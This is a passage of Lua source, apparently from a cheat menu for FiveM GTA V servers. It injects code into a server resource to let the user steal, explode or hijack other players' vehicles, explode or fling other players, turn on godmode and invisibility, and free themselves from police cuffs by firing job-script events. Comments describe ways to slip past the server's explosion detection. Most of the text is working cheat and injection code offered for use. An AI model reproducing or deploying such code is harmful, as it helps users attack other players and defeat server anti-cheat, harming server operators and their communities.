                                                    entities[#entities + 1] = vehicles[i]
                                                end

                                                for i = 1, #entities do
                                                    local entity = entities[i]
                                                    local setCoords = GetEntityCoords(entity)
                                                    local distance = #(setCoords - targetCoords)
                                                    local norm = (targetCoords - setCoords) / distance

                                                    SafeRunNative(SetEntityInvincible, entity, true)
                                                    SafeRunNative(SetEntityCanBeDamaged, entity, false)
                                                    SafeRunNative(ApplyForceToEntity, entity, 1, math.min(norm.x * 5.0, distance), math.min(norm.y * 5.0, distance), math.min(norm.z * 5.0, distance), 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                end
                                            end
                                        end
                                    },
                                    {
                                        id = 'steal_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Steal Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    TakeControlOfVehicle(entity)
                                                    SafeRunNative(TaskWarpPedIntoVehicle, PlayerPedId(), entity, -1)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'delete_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Delete Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    TakeControlOfVehicle(entity)
                                                    SafeRunNative(DeleteEntity, entity)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'bring_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Bring Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    TakeControlOfVehicle(entity)
                                                    SetCoords(entity, GetEntityCoords(PlayerPedId()))
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'remove_from_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Remove From Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    TakeControlOfVehicle(entity)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'destroy_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Destroy Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    TakeControlOfVehicle(entity)
                                                    SafeRunNative(SetVehicleEngineHealth, entity, -4000)
                                                    SafeRunNative(SetVehicleBodyHealth, entity, -4000)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'explode_vehicle',
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetEntityArchetypeName(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Explode Vehicle',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity, targetCoords, camCoords)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                -- vehicle_weapon_subcar_mg is hitscan but its hash is not on the
                                                -- explosion ignore list, so its blasts still hit the spawned
                                                -- explosion check. The laser cannon is on both lists.
                                                if not GetExplodeAllowance(2) then
                                                    return
                                                end

                                                local selfPed = PlayerPedId()
                                                local weaponHash = GetHashKey(explodeWeapon)
                                                local carAbove = GetOffsetFromEntityInWorldCoords(entity, 0.0, 0.0, 3.0)
                                                local carUnder = GetOffsetFromEntityInWorldCoords(entity, 0.0, 0.0, -3.0)
                                                local carMiddle = GetEntityCoords(entity)

                                                ShootBullet(selfPed, weaponHash, carMiddle, carAbove)
                                                ShootBullet(selfPed, weaponHash, carMiddle, carUnder)
                                            end
                                        end
                                    },
                                    {
                                        id = 'break_vehicle',
                                        holdCooldown = 500,
                                        liveLabel = function(isSelected, entity)
                                            return {
                                                label = 'Break Vehicle',
                                                data = GetVehicleData(isSelected, entity)
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                SafeRunNative(CreateThread, function()
                                                    if not TakeControlOfVehicle(entity) then
                                                        return
                                                    end

                                                    SafeRunNative(SetEntityAsMissionEntity, entity, true, true)

                                                    for i = 0, 5 do
                                                        SafeRunNative(SetVehicleTyreBurst, entity, i, true, 1000.0)
                                                    end

                                                    for i = 0, 7 do
                                                        SafeRunNative(SmashVehicleWindow, entity, i)
                                                    end

                                                    for i = 0, 5 do
                                                        SafeRunNative(SetVehicleDoorBroken, entity, i, true)
                                                    end

                                                    SafeRunNative(SetVehicleEngineHealth, entity, -4000.0)
                                                    SafeRunNative(SetVehiclePetrolTankHealth, entity, -4000.0)
                                                    SafeRunNative(SetVehicleBodyHealth, entity, 0.0)
                                                    SafeRunNative(SetVehicleUndriveable, entity, true)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'npc_hijack',
                                        holdCooldown = 800,
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected then
                                                local setDriver = setHijackDrivers[currentHijackDriver]

                                                data = '('..(setDriver and setDriver.label or '?')..')'

                                                local vehicleData = GetVehicleData(isSelected, entity)

                                                if vehicleData then
                                                    data = data..' '..vehicleData
                                                end
                                            end

                                            return {
                                                label = 'NPC Hijack Vehicle',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            if currentHijackDriver > 1 then
                                                currentHijackDriver = currentHijackDriver - 1
                                            else
                                                currentHijackDriver = #setHijackDrivers
                                            end

                                            _G.SetClient_CurrentSetFcHijackDriver = currentHijackDriver
                                        end,
                                        onRight = function()
                                            if currentHijackDriver < #setHijackDrivers then
                                                currentHijackDriver = currentHijackDriver + 1
                                            else
                                                currentHijackDriver = 1
                                            end

                                            _G.SetClient_CurrentSetFcHijackDriver = currentHijackDriver
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                local setDriver = setHijackDrivers[currentHijackDriver]

                                                if not setDriver then
                                                    return
                                                end

                                                SafeRunNative(CreateThread, function()
                                                    if not TakeControlOfVehicle(entity) then
                                                        return
                                                    end

                                                    local modelHash = LoadSetModel(setDriver.model)

                                                    if not modelHash then
                                                        return
                                                    end

                                                    local cachedSelfData = GetCachedSelfData()
                                                    local newDriver = SafeRunNative(CreatePedInsideVehicle, entity, setDriver.pedType or 4, modelHash, -1, true, false)

                                                    SafeRunNative(SetModelAsNoLongerNeeded, modelHash)
                                                    SetCurrentSelfData(cachedSelfData)

                                                    if not newDriver or newDriver == 0 then
                                                        return
                                                    end

                                                    SafeRunNative(SetEntityAsMissionEntity, newDriver, true, true)
                                                    SafeRunNative(SetPedFleeAttributes, newDriver, 0, false)
                                                    SafeRunNative(SetBlockingOfNonTemporaryEvents, newDriver, true)
                                                    SafeRunNative(SetPedKeepTask, newDriver, true)
                                                    SafeRunNative(SetPedCanBeDraggedOut, newDriver, false)
                                                    SafeRunNative(TaskVehicleDriveWander, newDriver, entity, 120.0, 786597)
                                                    SafeRunNative(SetDriveTaskDrivingStyle, newDriver, 786597)
                                                    SafeRunNative(SetEntityAsNoLongerNeeded, newDriver)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'copy_plate',
                                        holdCooldown = 500,
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected and entity then
                                                if entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                                    data = '('..(GetVehicleNumberPlateText(entity) or '?')..')'
                                                else
                                                    data = '(none)'
                                                end
                                            end

                                            return {
                                                label = 'Copy Plate',
                                                data = data
                                            }
                                        end,
                                        onHold = function(entity)
                                            if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                local plateText = GetVehicleNumberPlateText(entity)

                                                if not plateText or plateText == '' then
                                                    return
                                                end

                                                local selfVehicle = GetVehiclePedIsIn(PlayerPedId(), false)

                                                if not selfVehicle or selfVehicle <= 0 then
                                                    SendToHook('FreecamNotify', 'Plate: '..plateText..' (enter a vehicle to apply)', 'info')
                                                    return
                                                end

                                                SafeRunNative(CreateThread, function()
                                                    SafeRunNative(SetVehicleNumberPlateText, selfVehicle, plateText)
                                                    SafeRunNative(SetVehicleNumberPlateTextIndex, selfVehicle, GetVehicleNumberPlateTextIndex(entity))

                                                    SendToHook('FreecamNotify', 'Copied plate: '..plateText, 'success')
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'explode_player',
                                        label = 'Explode Player',
                                        holdCooldown = 1200,
                                        onHold = function(entity, targetCoords)
                                            local blastCoords = targetCoords

                                            if entity and entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 1 then
                                                blastCoords = GetEntityCoords(entity) + vec3(0.0, 0.0, 0.2)
                                            end

                                            if not blastCoords then
                                                return
                                            end

                                            if not GetExplodeAllowance() then
                                                return
                                            end

                                            -- Fire straight down through the target: the projectile detonates on
                                            -- the target itself, so the explosion is owned by a real weapon shot
                                            -- rather than a spawned explosion event.
                                            local fromCoords = blastCoords + vec3(0.0, 0.0, 3.0)

                                            ShootBullet('self', GetHashKey(explodeWeapon), blastCoords, fromCoords)
                                        end
                                    },
                                    {
                                        id = 'spawn_ped',
                                        holdCooldown = 400,
                                        liveLabel = function(isSelected)
                                            local data

                                            if isSelected then
                                                local setPed = setPeds[currentSpawnPed]

                                                data = '('..(setPed and setPed.label or '?')..')'

                                                if setPed and setPed.label == 'Custom Ped' then
                                                    data = data..' ('..(_G.SetClient_CustomSetFcSpawnPed or 'none')..')'
                                                end
                                            end

                                            return {
                                                label = 'Spawn Ped',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            if currentSpawnPed > 1 then
                                                currentSpawnPed = currentSpawnPed - 1
                                            else
                                                currentSpawnPed = #setPeds
                                            end

                                            _G.SetClient_CurrentSetFcSpawnPed = currentSpawnPed
                                        end,
                                        onRight = function()
                                            if currentSpawnPed < #setPeds then
                                                currentSpawnPed = currentSpawnPed + 1
                                            else
                                                currentSpawnPed = 1
                                            end

                                            _G.SetClient_CurrentSetFcSpawnPed = currentSpawnPed
                                        end,
                                        onEnter = function()
                                            local setPed = setPeds[currentSpawnPed]

                                            if setPed and setPed.label == 'Custom Ped' then
                                                SendToHook('FreecamPedInput')
                                            end
                                        end,
                                        onHold = function(entity, targetCoords, camCoords, camRotation)
                                            if not targetCoords then
                                                return
                                            end

                                            local setPed = setPeds[currentSpawnPed]

                                            if not setPed then
                                                return
                                            end

                                            local pedModel = setPed.model
                                            local pedType = setPed.pedType or 4

                                            if setPed.label == 'Custom Ped' then
                                                pedModel = _G.SetClient_CustomSetFcSpawnPed

                                                if not pedModel or pedModel == '' then
                                                    return
                                                end
                                            elseif not pedModel then
                                                local pickable = {}

                                                for i = 1, #setPeds do
                                                    if setPeds[i].model then
                                                        pickable[#pickable + 1] = setPeds[i]
                                                    end
                                                end

                                                if #pickable == 0 then
                                                    return
                                                end

                                                local randomPed = pickable[math.random(#pickable)]

                                                pedModel = randomPed.model
                                                pedType = randomPed.pedType or 4
                                            end

                                            if not GetSpawnAllowance() then
                                                return
                                            end

                                            SafeRunNative(CreateThread, function()
                                                local modelHash = LoadSetModel(pedModel)

                                                if not modelHash then
                                                    SendToHook('FreecamNotify', 'Invalid ped model: '..tostring(pedModel), 'error')
                                                    return
                                                end

                                                local ped = SafeRunNative(CreatePed, pedType, modelHash, targetCoords.x, targetCoords.y, targetCoords.z, camRotation.z, true, false)

                                                SafeRunNative(SetModelAsNoLongerNeeded, modelHash)

                                                if not ped or ped == 0 then
                                                    return
                                                end

                                                SafeRunNative(SetEntityAsMissionEntity, ped, true, true)
                                                SafeRunNative(SetPedFleeAttributes, ped, 0, false)
                                                SafeRunNative(SetBlockingOfNonTemporaryEvents, ped, true)
                                                SafeRunNative(SetPedCanRagdollFromPlayerImpact, ped, false)
                                                SafeRunNative(SetEntityAsNoLongerNeeded, ped)
                                            end)
                                        end
                                    },
                                    {
                                        id = 'phys_gun',
                                        holdCooldown = 0,
                                        getChanges = function()
                                            -- vehicles + peds + objects only; excluding the map means aiming
                                            -- at terrain simply returns no hit instead of a static handle.
                                            return {
                                                rayFlag = 26
                                            }
                                        end,
                                        liveLabel = function(isSelected, entity)
                                            local data

                                            if isSelected then
                                                local heldLabel = GetPhysEntityLabel(physHeldEntity)

                                                if heldLabel then
                                                    data = '('..heldLabel..') ('..string.format('%.1fm', physHoldDist)..')'
                                                else
                                                    data = '('..(GetPhysEntityLabel(entity) or 'none')..')'
                                                end
                                            end

                                            return {
                                                label = 'Phys Gun',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            physHoldDist = math.max(2.0, physHoldDist - 1.0)
                                        end,
                                        onRight = function()
                                            physHoldDist = math.min(100.0, physHoldDist + 1.0)
                                        end,
                                        onClick = function(entity, targetCoords, camCoords)
                                            PhysGunGrab(entity, camCoords)
                                        end,
                                        onHold = function(entity, targetCoords, camCoords, camRotation)
                                            if physHeldEntity == 0 then
                                                return
                                            end

                                            if not DoesEntityExist(physHeldEntity) then
                                                physHeldEntity = 0

                                                return
                                            end

                                            -- Same direction basis the freecam raycast uses, so the held entity
                                            -- tracks the crosshair exactly instead of drifting off centre.
                                            local radZ = math.rad(camRotation.z)
                                            local radX = math.rad(camRotation.x)
                                            local setNum = math.abs(math.cos(radX))
                                            local dir = vec3(-math.sin(radZ) * setNum, math.cos(radZ) * setNum, math.sin(radX))
                                            local goalCoords = camCoords + (dir * physHoldDist)
                                            local currentCoords = GetEntityCoords(physHeldEntity)
                                            local velocity = (goalCoords - currentCoords) * 6.0

                                            SafeRunNative(SetEntityVelocity, physHeldEntity, velocity.x, velocity.y, velocity.z)
                                            SafeRunNative(SetEntityRotation, physHeldEntity, camRotation.x, 0.0, camRotation.z, 2, true)
                                        end,
                                        onUnclick = function()
                                            PhysGunRelease()
                                        end,
                                        onUnhover = function()
                                            PhysGunRelease()
                                        end
                                    },
                                    {
                                        id = 'target_player',
                                        liveLabel = function(isSelected, entity)
                                            if entity and entity ~= 0 and IsEntityAPed(entity) and IsPedAPlayer(entity) then
                                                local pid = NetworkGetPlayerIndexFromPed(entity)
                                                if pid ~= PlayerId() then
                                                    return { label = 'Target', data = GetPlayerName(pid) or '?' }
                                                end
                                            end
                                            return { label = 'Target', data = 'aim at player' }
                                        end,
                                        onClick = function(entity)
                                            if not entity or entity == 0 then return end
                                            if not IsEntityAPed(entity) or not IsPedAPlayer(entity) then return end
                                            local pid = NetworkGetPlayerIndexFromPed(entity)
                                            if pid == PlayerId() then return end
                                            SendToHook('FcPlayerTarget', GetPlayerServerId(pid), GetPlayerName(pid) or '?')
                                        end
                                    },
                                }

                                local option = _G.SetClient_SavedFcSetOption

                                if not option or option > #options then
                                    option = 1
                                end

                                local hoveringOptions = {}

                                for i = 1, #options do
                                    local setOption = options[i]
                                    local liveLabel = setOption.liveLabel
                                    local hoveringData = {
                                        id = setOption.id,
                                        name = setOption.label
                                    }

                                    if liveLabel then
                                        local liveData = liveLabel(i == option)

                                        hoveringData.name = liveData.label
                                        hoveringData.data = liveData.data
                                    end

                                    hoveringOptions[#hoveringOptions + 1] = hoveringData
                                end

                                SendToHook('SetHoveringTextOptions', hoveringOptions)
                                SendToHook('SetHoveringTextOption', hoveringOptions[option].id)

                                SafeRunNative(CreateThread, function()
                                    for i = 1, 4 do
                                        Wait(200)

                                        SendToHook('SetHoveringTextOptions', hoveringOptions)
                                        SendToHook('SetHoveringTextOption', hoveringOptions[option].id)
                                    end
                                end)

                                CreateTrackedThread('Freecam', {
                                    thread = function(self)
                                        while self.isActive do
                                            if not cam or not DoesCamExist(cam) then
                                                break
                                            end

                                            if not IsCamActive(cam) or GetRenderingCam() ~= cam then
                                                SafeRunNative(SetCamActive, cam, true)
                                                SafeRunNative(RenderScriptCams, true, false, 0, true, true)
                                            end

                                            SafeRunNative(DisableAllControlActions, 0)
                                            SafeRunNative(EnableControlAction, 0, 249, true)

                                            local fcTargetSid = _G.SetClient_FcTargetSid
                                            if fcTargetSid then
                                                local fcActionCount = 8
                                                local fcIdx = _G.SetClient_FcTargetIdx or 1
                                                if IsDisabledControlJustPressed(0, 242) then
                                                    fcIdx = (fcIdx % fcActionCount) + 1
                                                    _G.SetClient_FcTargetIdx = fcIdx
                                                    SendToHook('FcTargetScroll', fcIdx)
                                                elseif IsDisabledControlJustPressed(0, 241) then
                                                    fcIdx = ((fcIdx - 2 + fcActionCount) % fcActionCount) + 1
                                                    _G.SetClient_FcTargetIdx = fcIdx
                                                    SendToHook('FcTargetScroll', fcIdx)
                                                elseif IsDisabledControlJustPressed(0, 215) then
                                                    local fcNames = { 'Teleport To', 'Bring Here', 'Spectate', 'Freeze', 'Explode', 'Launch', 'Fling', 'Burn' }
                                                    SendToHook('FcPlayerAction', fcNames[fcIdx], fcTargetSid)
                                                elseif IsDisabledControlJustPressed(0, 194) or IsDisabledControlJustPressed(0, 200) then
                                                    _G.SetClient_FcTargetSid = nil
                                                    _G.SetClient_FcTargetIdx = nil
                                                    SendToHook('FcTargetCancel')
                                                end
                                            else

                                            local previousOption = option
                                            local previousSetOption = options[option]
                                            local previousOnUnhover = previousSetOption.onUnhover

                                            if IsDisabledControlJustPressed(0, 242) then
                                                if option < #options then
                                                    option = option + 1
                                                else
                                                    option = 1
                                                end
                                            elseif IsDisabledControlJustPressed(0, 241) then
                                                if option > 1 then
                                                    option = option - 1
                                                else
                                                    option = #options
                                                end
                                            end

                                            local setOption = options[option]
                                            local onLeft = setOption.onLeft
                                            local onRight = setOption.onRight
                                            local onEnter = setOption.onEnter
                                            local onClick = setOption.onClick
                                            local onUnclick = setOption.onUnclick
                                            local onHover = setOption.onHover
                                            local onHold = setOption.onHold
                                            local getChanges = setOption.getChanges
                                            local forceUpdate = false
                                            local coords = GetCamCoord(cam)
                                            local rotation = GetCamRot(cam, 2)
                                            local radZ = math.rad(rotation.z)
                                            local setX = math.rad(rotation.x)
                                            local setNum = math.abs(math.cos(setX))
                                            local setFlag = 511

                                            if getChanges then
                                                local changes = getChanges()
                                                local newFlag = changes.rayFlag

                                                if newFlag then
                                                    setFlag = newFlag
                                                end
                                            end

                                            local retval, hit, endCoords, surface, entity = GetShapeTestResult(StartExpensiveSynchronousShapeTestLosProbe(coords.x, coords.y, coords.z, coords.x + (-math.sin(radZ) * setNum) * 500.0, coords.y + (math.cos(radZ) * setNum) * 500.0, coords.z + math.sin(setX) * 500.0, setFlag, PlayerPedId(), 7))

                                            if not hit or #(endCoords - vec3(0.0, 0.0, 0.0)) <= 0.0 then
                                                endCoords = nil
                                            end

                                            if previousOption ~= option then
                                                SendToHook('SetHoveringTextOption', setOption.id)

                                                if onHover then
                                                    onHover(option, previousOption)
                                                end

                                                if previousOnUnhover then
                                                    previousOnUnhover(previousOption, option)
                                                end
                                            else
                                                local liveLabel = setOption.liveLabel

                                                if liveLabel then
                                                    local liveData = liveLabel(true, entity, endCoords)

                                                    SendToHook('UpdateHoveringTextOption', setOption.id, {
                                                        name = liveData.name,
                                                        data = liveData.data
                                                    })

                                                end
                                            end

                                            if onLeft and IsDisabledControlJustPressed(0, 189) then
                                                onLeft()
                                            end

                                            if onRight and IsDisabledControlJustPressed(0, 190) then
                                                onRight()
                                            end

                                            if onEnter and IsDisabledControlJustPressed(0, 215) then
                                                onEnter()
                                            end

                                            if IsDisabledControlJustPressed(0, 24) then
                                                setOption.clicked = true

                                                if onClick then
                                                    onClick(entity, endCoords, coords, rotation)
                                                end
                                            elseif IsDisabledControlPressed(0, 24) then
                                                setOption.clicked = true

                                                if onHold then
                                                    local setTimer = GetGameTimer()

                                                    if not lastHold or (setTimer - lastHold) >= (setOption.holdCooldown or 100) then
                                                        lastHold = setTimer
                                                        local newData = onHold(entity, endCoords, coords, rotation)

                                                        if newData then
                                                            local newCoords = newData.coords

                                                            if newCoords then
                                                                coords = newCoords
                                                                forceUpdate = true
                                                            end
                                                        end
                                                    end
                                                end
                                            elseif setOption.clicked then
                                                setOption.clicked = false

                                                if onUnclick then
                                                    onUnclick(entity, endCoords, coords, rotation)
                                                end
                                            end

                                            local lookX = GetDisabledControlNormal(0, 1)
                                            local lookY = GetDisabledControlNormal(0, 2)
                                            local pitch = rotation.x
                                            local heading = rotation.z

                                            heading = heading + (lookX * -sensitivity)
                                            pitch = pitch + (lookY * -sensitivity)
                                            pitch = math.max(-89.9, math.min(89.9, pitch))

                                            SafeRunNative(SetCamRot, cam, pitch, 0.0, heading, 2)

                                            local dir = vec3(-math.sin(math.rad(heading)) * math.cos(math.rad(pitch)), math.cos(math.rad(heading)) * math.cos(math.rad(pitch)), math.sin(math.rad(pitch)))
                                            local move = vec3(0, 0, 0)

                                            if IsDisabledControlPressed(0, 32) then
                                                move = move + (dir * speedBase)
                                            end

                                            if IsDisabledControlPressed(0, 33) then
                                                move = move - (dir * speedBase)
                                            end

                                            if IsDisabledControlPressed(0, 34) then
                                                move = move + (vec3(-dir.y, dir.x, 0) * speedBase)
                                            end

                                            if IsDisabledControlPressed(0, 35) then
                                                move = move + (vec3(dir.y, -dir.x, 0) * speedBase)
                                            end

                                            if IsDisabledControlPressed(0, 21) then
                                                move = move * 5.0
                                            end

                                            if IsDisabledControlPressed(0, 36) then
                                                move = move / 5.0
                                            end

                                            SafeRunNative(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                            if #(move) > 0.01 or forceUpdate then
                                                local newCoords = coords + (move * 0.1)

                                                SafeRunNative(SetCamCoord, cam, newCoords.x, newCoords.y, newCoords.z)
                                            end

                                            end
                                            Wait(0)
                                        end
                                    end,
                                    onRemove = function()
                                        local setOption = options[option]
                                        local onUnhover = setOption.onUnhover
                                        local ped = PlayerPedId()

                                        _G.SetClient_SavedFcSetOption = option

                                        if onUnhover then
                                            onUnhover(option, false)
                                        end

                                        SafeRunNative(NewLoadSceneStop)
                                        SafeRunNative(ClearFocus)
                                        SafeRunNative(RenderScriptCams, false, false, 0, true, true)
                                        SafeRunNative(DestroyCam, cam, false)
                                    end
                                })
                            ]])
                        end
                    },
                    {
                        label = 'Super Punch',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    superPunch = true
                                    SafeRunNative(CreateThread, function()
                                        while superPunch do
                                            SafeRunNative(SetWeaponDamageModifier, GetHashKey('WEAPON_UNARMED'), 500.0)
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    superPunch = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Godmode',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    local setPed = PlayerPedId()
                                    SafeRunNative(SetEntityInvincible, setPed, true)
                                ]])
                            else
                                injectCode('monitor', [[
                                    local setPed = PlayerPedId()
                                    SafeRunNative(SetEntityInvincible, setPed, false)
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Invisibility',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    local setPed = PlayerPedId()
                                    SafeRunNative(SetEntityVisible, setPed, false, false)
                                ]])
                            else
                                injectCode('monitor', [[
                                    local setPed = PlayerPedId()
                                    SafeRunNative(SetEntityVisible, setPed, true, false)
                                ]])
                            end
                        end
                    },
                    {
                        label = 'No Ragdoll',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    noRagdoll = true
                                    SafeRunNative(CreateThread, function()
                                        while noRagdoll do
                                            SafeRunNative(SetPedCanRagdoll, PlayerPedId(), false)
                                            Wait(30)
                                        end
                                    end)    
                                ]])
                            else
                                injectCode('monitor', [[
                                    noRagdoll = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Fast Run',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    FastRun = true
                                    SafeRunNative(CreateThread, function()
                                        while FastRun do
                                            SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerId(), 1.49)
                                            SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 5.0)
                                            Wait(1)
                                        end
                                        SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerId(), 1.0)
                                        SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 1.0)
                                    end)  
                                ]])
                            else
                                injectCode('monitor', [[
                                    FastRun = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Infinite Stamina',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    infiniteStamina = true
                                    SafeRunNative(CreateThread, function()
                                        while infiniteStamina do
                                            SafeRunNative(ResetPlayerStamina, PlayerId())
                                            Wait(30)
                                        end
                                    end)    
                                ]])
                            else
                                injectCode('monitor', [[
                                    infiniteStamina = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Super Jump',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    SuperJumpToggle = true
                                    SafeRunNative(CreateThread, function()
                                        while SuperJumpToggle do
                                            SafeRunNative(SetSuperJumpThisFrame, PlayerId())
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    SuperJumpToggle = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Infinite Jump',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    InfiniteJump = true
                                    SafeRunNative(CreateThread, function()
                                        while InfiniteJump do
                                            if IsControlJustPressed(0, 18) then
                                                SafeRunNative(TaskJump, PlayerPedId(), false)
                                            end
                                            
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    InfiniteJump = false
                                ]])
                            end
                        end
                    },
                }
            },
            {
                name = 'Misc',
                submenu = {
                    {
                        label = 'Tiny Ped',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    tinyPed = true

                                    local function applyScaleToEntity(ped, scale)
                                        if not DoesEntityExist(ped) then return end
                                        if IsPedInAnyVehicle(ped, false) then return end

                                        local forward, right, upVector, position = GetEntityMatrix(ped)

                                        local fn = norm(forward)  * scale
                                        local rn = norm(right)    * scale
                                        local un = norm(upVector) * scale

                                        local entitySpeed = GetEntitySpeed(ped)
                                        local entityHeightAboveGround = GetEntityHeightAboveGround(ped)
                                        local adjustedZ = (entitySpeed <= 0 and entityHeightAboveGround < 2)
                                        and (entityHeightAboveGround - scale)
                                        or (GetEntityUprightValue(ped) - scale)

                                        SafeRunNative(SetEntityMatrix, ped, fn.x, fn.y, fn.z, rn.x, rn.y, rn.z, un.x, un.y, un.z, position.x, position.y, position.z - adjustedZ)
                                    end

                                    SafeRunNative(CreateThread, function()
                                        while tinyPed do
                                            Wait(0)
                                            applyScaleToEntity(PlayerPedId(), 0.5)
                                        end
                                        applyScaleToEntity(PlayerPedId(), 1.0)
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    tinyPed = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Uncuff Self',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local ped = PlayerPedId()

                                SafeRunNative(SetEnableHandcuffs, ped, false)
                                SafeRunNative(ClearPedTasksImmediately, ped)
                                SafeRunNative(ClearPedSecondaryTask, ped)
                                SafeRunNative(FreezeEntityPosition, ped, false)
                                SafeRunNative(DetachEntity, ped, true, false)
                                SafeRunNative(SetEntityMaxSpeed, ped, 50.0)
                                SafeRunNative(SetPedCanRagdoll, ped, true)
                                SafeRunNative(SetPlayerControl, PlayerId(), true, 0)

                                if GetPedPropIndex(ped, 7) ~= -1 then
                                    SafeRunNative(ClearPedProp, ped, 7)
                                end
                            ]])

                            local cuffResources = {
                                { resource = 'wasabi_police',  event = 'wasabi_police:client:uncuffSelf' },
                                { resource = 'ps-cuff',        event = 'ps-cuff:client:uncuff' },
                                { resource = 'qb-policejob',   event = 'qb-policejob:client:uncuffPlayer' },
